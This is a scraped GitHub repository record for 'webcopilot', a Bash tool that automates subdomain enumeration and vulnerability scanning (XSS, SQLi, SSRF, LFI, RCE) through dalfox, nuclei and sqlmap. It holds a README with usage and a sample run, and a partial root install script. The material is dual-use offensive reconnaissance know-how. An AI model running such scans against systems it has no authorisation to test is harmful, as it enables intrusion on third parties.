{
  "metadata": {
    "timestamp": 1736568790071,
    "page": 925,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjkyOQ==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "h4r5h1t/webcopilot",
      "stars": 1072,
      "defaultBranch": "main",
      "files": [
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.03125,
          "content": "# webcopilot output\nwebcopilot-*"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.048828125,
          "content": "MIT License\n\nCopyright (c) 2021 Harshit Raj Singh\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 18.7705078125,
          "content": "<h1 align=\"center\"><a href=\"https://github.com/h4r5h1t/webcopilot/\">WebCopilot</a></h1>\n<h4 align=\"center\">An automation tool that enumerate subdomains then filters out xss, sqli, open redirect, lfi, ssrf and rce parameters and then scans for vulnerabilities.</h4>\n\n<p align=\"center\">\n<a href=\"https://twitter.com/h4r5h1t_hrs\"><img src=\"https://img.shields.io/twitter/follow/h4r5h1t_hrs?style=social\"></a>\n<a href=\"https://github.com/h4r5h1t?tab=followers\"><img src=\"https://img.shields.io/github/followers/h4r5h1t?style=social\"></a>\n<a href=\"https://github.com/h4r5h1t/webcopilot/issues\"><img src=\"https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat\"></a>\n<a href=\"https://github.com/h4r5h1t/webcopilot/blob/master/LICENSE\"><img src=\"https://img.shields.io/badge/License-MIT-yellow.svg\"></a>\n<a href=\"#\"><img src=\"https://img.shields.io/badge/Made%20with-Bash-1f425f.svg\"></a>\n<a href=\"#\"><img src=\"https://madewithlove.org.in/badge.svg\"></a>\n</p>\n\n<p align=\"center\">\n  <a href=\"#features\">Features</a> •\n  <a href=\"#installing-webCopilot\">Installation</a> •\n  <a href=\"#usage\">Usage</a> •\n  <a href=\"#running-webcopilot\">WebCopilot</a> •\n  <a href=\"#tools-used\">Tools Used</a> •\n  <a href=\"#acknowledgement\">Acknowledgement</a>\n</p>\n\n---\n\n**WebCopilot** is an automation tool designed to enumerate subdomains of the target and detect bugs using different open-source tools.\n\nThe script first enumerate all the subdomains of the given target domain using assetfinder, sublister, subfinder, amass, findomain, hackertarget, riddler and crt then do active subdomain enumeration using gobuster from SecLists wordlist then filters out all the live subdomains using dnsx then it extract titles of the subdomains using httpx & scans for subdomain takeover using subjack. Then it uses gau/gauplus, waybackurls, or waymore to crawl all the endpoints of the given subdomains then it use gf patterns to filters out xss, lfi, ssrf, sqli, open redirect & rce parameters from that given subdomains, and then it scans for vulnerabilities on the subdomains using different open-source tools (like kxss, dalfox, openredirex, nuclei, etc). Then it'll print out the result of the scan and save all the output in a specified directory. \n\n# Features\n\n- Subdomain Enumeration using [assetfinder](https://github.com/tomnomnom/assetfinder), [SUBLIST3R_V2.0](https://github.com/hxlxmjxbbxs/SUBLIST3R_V2.0), [subfinder](https://github.com/projectdiscovery/subfinder), [amass](https://github.com/OWASP/Amass), [findomain](https://github.com/Findomain/Findomain), etc.\n- Active Subdomain Enumeration using [gobuster](https://github.com/OJ/gobuster) & [amass](https://github.com/OWASP/Amass) from [SecLists/DNS](https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS) wordlist.\n- Extract titles and take screenshots of live subdomains using [aquatone](https://github.com/michenriksen/aquatone) & [httpx](https://github.com/projectdiscovery/httpx).\n- Crawl all the endpoints of the subdomains using [waymore](https://github.com/xnl-h4ck3r/waymore) and filter out XSS, SQLi, SSRF, etc parameters using [gf patterns](https://github.com/tomnomnom/gf).\n- Run different open-source tools (like [dalfox](https://github.com/hahwul/dalfox), [nuclei](https://github.com/projectdiscovery/nuclei), [sqlmap](https://github.com/sqlmapproject/sqlmap), etc) to search for vulnerabilities on these parameters and then save all the outputs in the folder.\n\n\n# Usage\n```bash\ng!2m0:~ webcopilot -h\n```\n\n```js                    \n                                ──────▄▀▄─────▄▀▄\n                                ─────▄█░░▀▀▀▀▀░░█▄\n                                ─▄▄──█░░░░░░░░░░░█──▄▄\n                                █▄▄█─█░░▀░░┬░░▀░░█─█▄▄█\n ██╗░░░░░░░██╗███████╗██████╗░░█████╗░░█████╗░██████╗░██╗██╗░░░░░░█████╗░████████╗\n░██║░░██╗░░██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║██║░░░░░██╔══██╗╚══██╔══╝\n░╚██╗████╗██╔╝█████╗░░██████╦╝██║░░╚═╝██║░░██║██████╔╝██║██║░░░░░██║░░██║░░░██║░░░\n░░████╔═████║░██╔══╝░░██╔══██╗██║░░██╗██║░░██║██╔═══╝░██║██║░░░░░██║░░██║░░░██║░░░\n░░╚██╔╝░╚██╔╝░███████╗██████╦╝╚█████╔╝╚█████╔╝██║░░░░░██║███████╗╚█████╔╝░░░██║░░░\n░░░╚═╝░░░╚═╝░░╚══════╝╚═════╝░░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚══════╝░╚════╝░░░░╚═╝░░░\n                                                                [●] Version: 2.0.0\n                                                                [●] @h4r5h1t | G!2m0\n\n\n[❌] Warning: Use with caution. You are responsible for your own actions.\n[❌] Developers assume no liability and are not responsible for any misuse or damage cause by this tool.\n\n\nUsage:\nwebcopilot -d <target>\nwebcopilot -d <target> -a\nwebcopilot [-d target] [-o output destination] [-t threads] [-b blind server URL] [-x exclude domains] [-f subdomains file] [-a] [-v] [-h]\nFlags:\n  -d        Add your target [Optional]\n  -o        To save outputs in folder [Default: webcopilot-<timestamp>]\n  -t        Number of threads [Default: 100]\n  -b        Add your server for BXSS [Default: False]\n  -x        Exclude out of scope domains [Default: False]\n  -f        Specify a file containing subdomains, this will skip subdomain enumeration [Optional]\n  -a        Run all Enumeration by default it will run only subdomain enumeration [Default: False][Time Consuming]\n  -v        Show version of the tool\n  -h        Show this help message\n\nExample:./webcopilot  -d domain.com -a -o domain -t 333 -x exclude.txt -b testServer.oast.fun\nYou can use  https://app.interactsh.com/ to get your server\n```\n# Installing WebCopilot\n\nWebCopilot requires **git** to install successfully. Run the following command as a **root** to install webcopilot \n\n```bash\ngit clone https://github.com/h4r5h1t/webcopilot && cd webcopilot/ && chmod +x webcopilot install.sh && mv webcopilot /usr/bin/ && ./install.sh\n```\n```js\n[*] Installing Tools\n[*] Creating Directories\n[*] Installing Dependencies and Checking is Installed or Not\n[*] git is already installed\n[*] python3 is already installed\n[*] python3-pip is already installed\n[*] ruby is already installed\n[*] golang-go is already installed\n[*] snapd could not be found [*] Installing snapd\n[*] snapd is not installed successfully, Please install it manually\n[*] cmake is already installed\n[*] jq is already installed\n[*] gobuster is already installed\n[*] chromium is already installed\n[*] parallel is already installed\n[*] Installing Python Tools\n[*] Sublist3r could not be found [*] Installing Sublist3r\n[*] Sublist3r is installed successfully\n[*] sqlmap is already installed\n[*] urldedupe is already installed\n[*] openredirex is already installed\n[*] waymore is already installed\n[*] findomain is already installed\n[*] uro is already installed\n[*] Installing Wordlists and Payloads\n[*] Skipping payloads/lfi.txt, already exists.\n[*] Skipping resolvers.txt, already exists.\n[*] Skipping subdomains.txt, already exists.\n[*] Skipping fuzz.txt, already exists.\n[*] Skipping dicc.txt, already exists.\n[*] Skipping big.txt, already exists.\n[*] Skipping dns.txt, already exists.\n[*] Installing Go Tools\n[*] anew is already installed\n[*] gf is already installed\n[*] aquatone could not be found [*] Installing aquatone\n[*] aquatone is not installed successfully, Please install it manually\n[*] assetfinder is already installed\n[*] gau is already installed\n[*] waybackurls is already installed\n[*] httpx could not be found [*] Installing httpx\n[*] httpx is not installed successfully, Please install it manually\n[*] amass could not be found [*] Installing amass\n[*] amass is not installed successfully, Please install it manually\n[*] kxss is already installed\n[*] subjack is already installed\n[*] qsreplace is already installed\n[*] dnsx could not be found [*] Installing dnsx\n[*] dnsx is not installed successfully, Please install it manually\n[*] dalfox is already installed\n[*] crlfuzz is already installed\n[*] nuclei could not be found [*] Installing nuclei\n[*] nuclei is not installed successfully, Please install it manually\n[*] subfinder could not be found [*] Installing subfinder\n[*] subfinder is not installed successfully, Please install it manually\n[*] Configuring Tools and Setting Up Environment\n[*] All Tools are installed successfully\n```\n\n### Tools Used:\n\n<p align=\"center\">\n<a href=\"https://github.com/projectdiscovery/subfinder\">SubFinder</a> • \n<a href=\"https://github.com/aboul3la/Sublist3r\">Sublist3r</a> •\n<a href=\"https://github.com/Findomain/Findomain\">Findomain</a> •\n<a href=\"https://github.com/tomnomnom/gf\">gf</a> •\n<a href=\"https://github.com/devanshbatham/OpenRedireX\">OpenRedireX</a> •\n<a href=\"https://github.com/projectdiscovery/dnsx\">dnsx</a> •\n<a href=\"https://github.com/sqlmapproject/sqlmap\">sqlmap</a> •\n<a href=\"https://github.com/OJ/gobuster\">gobuster</a> •\n<a href=\"https://github.com/tomnomnom/assetfinder\">assetfinder</a> •\n<a href=\"https://github.com/projectdiscovery/httpx\">httpx</a> •\n<a href=\"https://github.com/Emoe/kxss\">kxss</a> •\n<a href=\"https://github.com/tomnomnom/qsreplace\">qsreplace</a> •\n<a href=\"https://github.com/projectdiscovery/nuclei\">Nuclei</a> •\n<a href=\"https://github.com/hahwul/dalfox\">dalfox</a> •\n<a href=\"https://github.com/tomnomnom/anew\">anew</a> •\n<a href=\"https://github.com/stedolan/jq\">jq</a> •\n<a href=\"https://github.com/michenriksen/aquatone\">aquatone</a> •\n<a href=\"https://github.com/ameenmaali/urldedupe\">urldedupe</a> •\n<a href=\"https://github.com/OWASP/Amass\">Amass</a> •\n<a href=\"https://github.com/bp0lr/gauplus\">gauplus</a> •\n<a href=\"https://github.com/tomnomnom/waybackurls\">waybackurls</a> •\n<a href=\"https://github.com/dwisiswant0/crlfuzz\">crlfuzz</a> •\n<a href=\"https://github.com/lc/gau\">gau</a> •\n<a href=\"https://github.com/xnl-h4ck3r/waymore\">waymore</a> •\n<a href=\"https://github.com/hxlxmjxbbxs/SUBLIST3R_V2.0\">SUBLIST3R_V2.0</a> •\n<a href=\"https://github.com/s0md3v/uro\">uro</a>\n</p>\n\n## Running WebCopilot\nTo run the tool on a target, just use the following command.\n```bash\ng!2m0:~ webcopilot -d example.com\n```\nThe `-o` command can be used to specify an output dir.\n```bash\ng!2m0:~ webcopilot -d example.com -o example\n```\n<!-- The `-s` command can be used for only subdomain enumerations (Active + Passive and also get title & screenshots). -->\nThe `-a` command can be used for running all enumerations (Subdomain Enumeration + Vulnerabilities Scanning).\n```bash\ng!2m0:~ webcopilot -d example.com -o example -a\n```\nThe `-t` command can be used to add threads to your scan for faster result.\n```bash\ng!2m0:~ webcopilot -d example.com -o example -t 333 \n```\nThe `-b` command can be used for blind xss (OOB), you can get your server from [interact](https://app.interactsh.com/)\n```bash \ng!2m0:~ webcopilot -d example.com -o example -t 333 -b eeuyhzfnsezrraragtd70ex5oc2hsw.oast.fun\n```\nThe `-x` command can be used to exclude out of scope domains.\n```bash\ng!2m0:~ echo out.example.com > excludeDomain.txt\ng!2m0:~ webcopilot -d example.com -o example -t 333 -x excludeDomain.txt -b eeuyhzfnsezrraragtd70ex5oc2hsw.oast.fun\n```\nThe `-f` command can be used to pass file containing subdomains (using this skip Active + Passive Subdomain enumeration)\n```bash\ng!2m0:~ webcopilot -d example.com -o example -f /home/ubuntu/subdomains.txt -a\n```\n## Example\nDefault options looks like this:\n```bash\ng!2m0:~ webcopilot -d http://testphp.vulnweb.com/ -a -b eeuyhzfpwgnsezrraragtd70ex5oc2hsw.oast.fun\n```\n\n```js\n                                ──────▄▀▄─────▄▀▄\n                                ─────▄█░░▀▀▀▀▀░░█▄\n                                ─▄▄──█░░░░░░░░░░░█──▄▄\n                                █▄▄█─█░░▀░░┬░░▀░░█─█▄▄█\n ██╗░░░░░░░██╗███████╗██████╗░░█████╗░░█████╗░██████╗░██╗██╗░░░░░░█████╗░████████╗\n░██║░░██╗░░██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║██║░░░░░██╔══██╗╚══██╔══╝\n░╚██╗████╗██╔╝█████╗░░██████╦╝██║░░╚═╝██║░░██║██████╔╝██║██║░░░░░██║░░██║░░░██║░░░\n░░████╔═████║░██╔══╝░░██╔══██╗██║░░██╗██║░░██║██╔═══╝░██║██║░░░░░██║░░██║░░░██║░░░\n░░╚██╔╝░╚██╔╝░███████╗██████╦╝╚█████╔╝╚█████╔╝██║░░░░░██║███████╗╚█████╔╝░░░██║░░░\n░░░╚═╝░░░╚═╝░░╚══════╝╚═════╝░░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚══════╝░╚════╝░░░░╚═╝░░░\n                                                                [●] Version: 2.0.0\n                                                                [●] @h4r5h1t | G!2m0\n\n\n[❌] Warning: Use with caution. You are responsible for your own actions.\n[❌] Developers assume no liability and are not responsible for any misuse or damage cause by this tool.\n\n\nTarget:  http://testphp.vulnweb.com/\nOutput:  /home/ubuntu/github/webcopilot/webcopilot-1714304809\nThreads: 100\nServer:  eeuyhzfpwgnsezdyeragtd70ex5oc2hsw.oast.fun\nExclude: False\nMode:    Running all Enumeration\nTime:    28-04-2024 17:16:49\n\n[!] Please wait while scanning...\n\n[●] Passive Subdomain Scanning is in progress:\n\n[●] Subdomain Scanned  -  [assetfinder✔]                 Subdomain Found: 0\n[●] Subdomain Scanned  -  [SUBLIST3R_V2.0✔]              Subdomain Found: 0\n[●] Subdomain Scanned  -  [subfinder✔]                   Subdomain Found: 1\n[●] Subdomain Scanned  -  [amass✔]                       Subdomain Found: 0\n[●] Subdomain Scanned  -  [findomain✔]                   Subdomain Found: 1\n\n[●] Subdomain Scanned  -  [crt.sh✔]                      Subdomain Found: 0\n[●] Subdomain Scanned  -  [hackertarget✔]                Subdomain Found: 1\n[●] Subdomain Scanned  -  [riddler✔]                     Subdomain Found: 0\n[●] Subdomain Scanned  -  [certspotter✔]                 Subdomain Found: 0\n\n[●] Active Subdomain Scanning is in progress:\n[!] Please be patient. This may take a while...\n[●] Active Subdomain Scanned  -  [gobuster✔]             Subdomain Found: 0\n[●] Active Subdomain Scanned  -  [amass✔]                Subdomain Found: 0\n\n[●] Subdomain Filtering: Filtering Alive subdomains\n[●] Subdomain Filtering  -   Filtering alive subdomains is completed.    Check: /subdomains/alivesub.txt\n[●] Subdomain Scanning: Getting titles of valid subdomains\n[●] Visual inspection of Subdomains is completed.        Check: /subdomains/aquatone/\n\n[●] Subdomain Enumeration Completed.    Total: 1 | Alive: 1\n\n[●] Endpoints Scanning Completed.  Total: 0\n[●] Vulnerabilities Scanning is in progress: Getting all vulnerabilities of \n[●] Vulnerabilities Scanning is in progress:\n\n[●] Vulnerabilities Scanned  -  [XSS✔]                   Found: 0\n[●] Vulnerabilities Scanned  -  [SQLi✔]                  Found: 0\n[●] Vulnerabilities Scanned  -  [LFI✔]                   Found: 0\n[●] Vulnerabilities Scanned  -  [CRLF✔]                  Found: 0\n[●] Vulnerabilities Scanned  -  [SSRF✔]                  Found: 0\n[●] Vulnerabilities Scanned  -  [Open redirect✔]         Found: 0\n[●] Vulnerabilities Scanned  -  [Subdomain Takeover✔]    Found: 0\n[●] Vulnerabilities Scanned  -  [Nuclie✔]                Found: 0\n[●] Vulnerabilities Scanning Completed.    Check: /vulnerabilities/\n\n\n▒█▀▀█ █▀▀ █▀▀ █░░█ █░░ ▀▀█▀▀\n▒█▄▄▀ █▀▀ ▀▀█ █░░█ █░░ ░░█░░\n▒█░▒█ ▀▀▀ ▀▀▀ ░▀▀▀ ▀▀▀ ░░▀░░\n\n[+] Subdomains of http://testphp.vulnweb.com/\n[+] Subdomains Found: 1\n[+] Subdomains Alive: 1\n[+] Endpoints: 0\n[+] XSS: 0\n[+] SQLi: 0\n[+] Open Redirect: 0\n[+] SSRF: 0\n[+] CRLF: 0\n[+] LFI: 0\n[+] Subdomain Takeover: 0\n[+] Nuclei: 0\n```\n---\n\n### Acknowledgement\nWebCopilot is inspired from [Garud](https://github.com/R0X4R/Garud) & [Pinaak](https://github.com/R0X4R/Pinaak) by [ROX4R](https://github.com/R0X4R/).  \n\n#### Thanks to the authors of the tools & wordlists used in this script.\n\n[@aboul3la](https://github.com/aboul3la) [@tomnomnom](https://github.com/tomnomnom) [@lc](https://github.com/lc) [@hahwul](https://github.com/hahwul) [@projectdiscovery](https://github.com/projectdiscovery) [@maurosoria](https://github.com/maurosoria) [@shelld3v](https://github.com/shelld3v) [@devanshbatham](https://github.com/devanshbatham) [@michenriksen](https://github.com/michenriksen) [@defparam](https://github.com/defparam/) [@projectdiscovery](https://github.com/projectdiscovery) [@bp0lr](https://github.com/bp0lr/) [@ameenmaali](https://github.com/ameenmaali) [@sqlmapproject](https://github.com/sqlmapproject/sqlmap) [@dwisiswant0](https://github.com/dwisiswant0) [@OWASP](https://github.com/OWASP/) [@OJ](https://github.com/OJ/) [@Findomain](https://github.com/Findomain/Findomain) [@danielmiessler](https://github.com/danielmiessler) [@1ndianl33t](https://github.com/1ndianl33t) [@ROX4R](https://github.com/R0X4R/) [@xnl-h4ck3r](https://github.com/xnl-h4ck3r/) [@hxlxmjxbbxs](https://github.com/hxlxmjxbbxs/) [@s0md3v](https://github.com/s0md3v/)\n\n<table>\n<td>\n<b>Warning:</b> Developers assume no liability and are not responsible for any misuse or damage cause by this tool. So, please se with caution because you are responsible for your own actions.\n</td>\n</table>\n"
        },
        {
          "name": "install.sh",
          "type": "blob",
          "size": 29.5078125,
          "content": "#!/bin/bash\n\n#Colors Output\nNORMAL=\"\\e[0m\"\nBOLD=\"\\033[01;01m\"\nRED=\"\\033[0;31m\"\nGREEN=\"\\033[0;32m\"\nYELLOW=\"\\033[1;33m\"\nLCYAN=\"\\033[1;36m\"\n\n# Check if the script is running as root or not\nif [ \"$(id -u)\" != \"0\" ]; then\n    echo -e \"${RED}[*]${NORMAL} This script must be run as root\" 1>&2\n    echo -e \"${YELLOW}[*]${NORMAL} Make sure you're root before installing the tools\"\n    echo -e \"${LCYAN}[*]${NORMAL} Exiting...\"\n    exit 1\nfi\nclear\ncd\n\n# Create Directories\ndirs(){\n    echo -e \"${LCYAN}[*]${NORMAL} Creating Directories\"\n    mkdir -p ~/tools\n    mkdir -p ~/.gf\n    mkdir -p ~/wordlists\n    mkdir -p ~/wordlists/payloads/\n}\n\n# Update and Upgrade System\necho -e \"${LCYAN}[*]${NORMAL} Updating and Upgrading System\"\nsudo apt-get update -y 2> /dev/null\n\n# Install Dependencies\ndependencies(){\n    echo -e \"${LCYAN}[*]${NORMAL} Installing Dependencies and Checking is Installed or Not\"\n    if ! command -v git &> /dev/null; then\n        echo -e \"${YELLOW}[*]${NORMAL} git could not be found ${LCYAN}[*]${NORMAL} Installing git\"\n        sudo apt install git -y 2> /dev/null\n        if command -v git &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} git is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} git is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} git is already installed\"\n    fi\n\n    if ! command -v python3 &> /dev/null; then\n        echo -e \"${YELLOW}[*]${NORMAL} python3 could not be found ${LCYAN}[*]${NORMAL} Installing python3\"\n        sudo apt install python3 -y 2> /dev/null\n        if command -v python3 &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} python3 is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} python3 is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} python3 is already installed\"\n    fi\n\n    if ! command -v pip3 &> /dev/null; then\n        echo -e \"${YELLOW}[*]${NORMAL} pip3 could not be found ${LCYAN}[*]${NORMAL} Installing python3-pip\"\n        sudo apt install python3-pip -y 2> /dev/null\n        if command -v pip3 &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} python3-pip is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} python3-pip is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} python3-pip is already installed\"\n    fi\n\n    # # Set Python3 Environment Variables if not set\n    # if [ -z \"$PYTHONPATH\" ]; then\n    #     echo -e \"${LCYAN}[*]${NORMAL} Setting Up Python3 Environment Variables\"\n    #     echo 'export PYTHONPATH=$HOME/.local/lib/python3.8/site-packages' >> ~/.bashrc\n    #     echo 'export PATH=$PATH:$HOME/.local/bin' >> ~/.bashrc\n    #     source ~/.bashrc\n    #     if [ -z \"$PYTHONPATH\" ]; then\n    #         echo -e \"${RED}[*]${NORMAL} Python3 Environment Variables are not set, Please set it manually\"\n    #     else\n    #         echo -e \"${GREEN}[*]${NORMAL} Python3 Environment Variables are set successfully\"\n    #     fi\n    # else \n    #     echo -e \"${GREEN}[*]${NORMAL} Python3 Environment Variables are already set\"\n    # fi\n\n\n    if ! command -v ruby &> /dev/null; then\n        echo -e \"${YELLOW}[*]${NORMAL} ruby could not be found ${LCYAN}[*]${NORMAL} Installing ruby\"\n        sudo apt install ruby -y 2> /dev/null\n        if command -v ruby &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} ruby is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} ruby is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} ruby is already installed\"\n    fi\n\n    # # Set Ruby Environment Variables if not set\n    # if [ -z \"$GEM_HOME\" ]; then\n    #     echo -e \"${LCYAN}[*]${NORMAL} Setting Up Ruby Environment Variables\"\n    #     echo 'export GEM_HOME=$HOME/.gem' >> ~/.bashrc\n    #     echo 'export PATH=$PATH:$GEM_HOME/bin' >> ~/.bashrc\n    #     source ~/.bashrc\n    #     if [ -z \"$GEM_HOME\" ]; then\n    #         echo -e \"${RED}[*]${NORMAL} Ruby Environment Variables are not set, Please set it manually\"\n    #     else\n    #         echo -e \"${GREEN}[*]${NORMAL} Ruby Environment Variables are set successfully\"\n    #     fi\n    # else \n    #     echo -e \"${GREEN}[*]${NORMAL} Ruby Environment Variables are already set\"\n    # fi\n\n    if ! command -v go &> /dev/null; then\n        echo -e \"${YELLOW}[*]${NORMAL} golang-go could not be found ${LCYAN}[*]${NORMAL} Installing golang-go\"\n        # sudo apt install golang-go -y 2> /dev/null\n        wget https://go.dev/dl/go1.22.2.linux-amd64.tar.gz\n        sudo tar -C /usr/local -xzf go1.22.2.linux-amd64.tar.gz\n        echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc\n        echo 'export GOROOT=/usr/local/go' >> ~/.bashrc\n        echo 'export GOPATH=$HOME/go' >> ~/.bashrc\n        source ~/.bashrc\n        if command -v go &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} golang-go is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} golang-go is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} golang-go is already installed\"\n    fi\n\n    # # Set Go Environment Variables if not set\n    # if [ -z \"$GOPATH\" ]; then\n    #     echo -e \"${LCYAN}[*]${NORMAL} Setting Up Go Environment Variables\"\n        # echo 'export GOPATH=$HOME/go' >> ~/.bashrc\n        # echo 'export PATH=$PATH:$GOPATH/bin' >> ~/.bashrc\n    #     source ~/.bashrc\n    #     if [ -z \"$GOPATH\" ]; then\n    #         echo -e \"${RED}[*]${NORMAL} Go Environment Variables are not set, Please set it manually\"\n    #     else\n    #         echo -e \"${GREEN}[*]${NORMAL} Go Environment Variables are set successfully\"\n    #     fi\n    # else \n    #     echo -e \"${GREEN}[*]${NORMAL} Go Environment Variables are already set\"\n    # fi\n\n    if ! command -v snapd &> /dev/null; then\n        echo -e \"${YELLOW}[*]${NORMAL} snapd could not be found ${LCYAN}[*]${NORMAL} Installing snapd\"\n        sudo apt install snapd -y 2> /dev/null\n        if command -v snapd &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} snapd is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} snapd is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} snapd is already installed\"\n    fi\n\n    if ! command -v cmake &> /dev/null; then\n        echo -e \"${YELLOW}[*]${NORMAL} cmake could not be found ${LCYAN}[*]${NORMAL} Installing cmake\"\n        sudo apt install cmake -y 2> /dev/null\n        if command -v cmake &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} cmake is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} cmake is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} cmake is already installed\"\n    fi\n\n    if ! command -v jq &> /dev/null; then\n        echo -e \"${YELLOW}[*]${NORMAL} jq could not be found ${LCYAN}[*]${NORMAL} Installing jq\"\n        sudo apt install jq -y 2> /dev/null\n        if command -v jq &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} jq is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} jq is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} jq is already installed\"\n    fi\n\n    if ! command -v gobuster &> /dev/null; then\n        echo -e \"${YELLOW}[*]${NORMAL} gobuster could not be found ${LCYAN}[*]${NORMAL} Installing gobuster\"\n        sudo apt install gobuster -y 2> /dev/null\n        if command -v gobuster &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} gobuster is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} gobuster is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} gobuster is already installed\"\n    fi\n\n    if ! command -v chromium &> /dev/null; then\n        echo -e \"${YELLOW}[*]${NORMAL} chromium could not be found ${LCYAN}[*]${NORMAL} Installing chromium\"\n        sudo snap install chromium 2> /dev/null\n        if command -v chromium &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} chromium is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} chromium is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} chromium is already installed\"\n    fi\n\n    if ! command -v parallel &> /dev/null; then\n        echo -e \"${YELLOW}[*]${NORMAL} parallel could not be found ${LCYAN}[*]${NORMAL} Installing parallel\"\n        sudo apt-get install -y parallel 2> /dev/null\n        if command -v parallel &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} parallel is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} parallel is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} parallel is already installed\"\n    fi\n}\n\nsleep 2s\nclear\n\n# Install Python Tools\npython_tools(){\n    echo -e \"${LCYAN}[*]${NORMAL} Installing Python Tools\"\n    ### Replace aboul3la/Sublist3r with SUBLIST3R_V2.0 by hxlxmjxbbxs - Visit here: (https://github.com/hxlxmjxbbxs/sublist3rV2)\n    # cd && git clone https://github.com/aboul3la/Sublist3r.git ~/tools/Sublist3r && cd ~/tools/Sublist3r && sudo pip3 install -r requirements.txt 2> /dev/null\n    if [ ! -d ~/tools/SUBLIST3R_V2.0 ]; then\n        echo -e \"${YELLOW}[*]${NORMAL} Sublist3r could not be found ${LCYAN}[*]${NORMAL} Installing Sublist3r\"\n        cd && git clone https://github.com/hxlxmjxbbxs/SUBLIST3R_V2.0 ~/tools/SUBLIST3R_V2.0 && cd ~/tools/SUBLIST3R_V2.0 && sudo pip3 install -r requirements.txt 2> /dev/null\n        if [ -d ~/tools/SUBLIST3R_V2.0 ]; then\n            echo -e \"${GREEN}[*]${NORMAL} Sublist3r is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} Sublist3r is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} Sublist3r is already installed\"\n    fi\n    \n    if [ ! -d ~/tools/sqlmap ]; then\n        echo -e \"${YELLOW}[*]${NORMAL} sqlmap could not be found ${LCYAN}[*]${NORMAL} Installing sqlmap\"\n        cd && git clone https://github.com/sqlmapproject/sqlmap.git ~/tools/sqlmap/ 2> /dev/null\n        if [ -d ~/tools/sqlmap ]; then\n            echo -e \"${GREEN}[*]${NORMAL} sqlmap is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} sqlmap is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} sqlmap is already installed\"\n    fi\n\n    if [ ! -d ~/tools/urldedupe ]; then\n        echo -e \"${YELLOW}[*]${NORMAL} urldedupe could not be found ${LCYAN}[*]${NORMAL} Installing urldedupe\"\n        cd && git clone https://github.com/ameenmaali/urldedupe.git ~/tools/urldedupe && cd ~/tools/urldedupe && cmake CMakeLists.txt && make && mv urldedupe 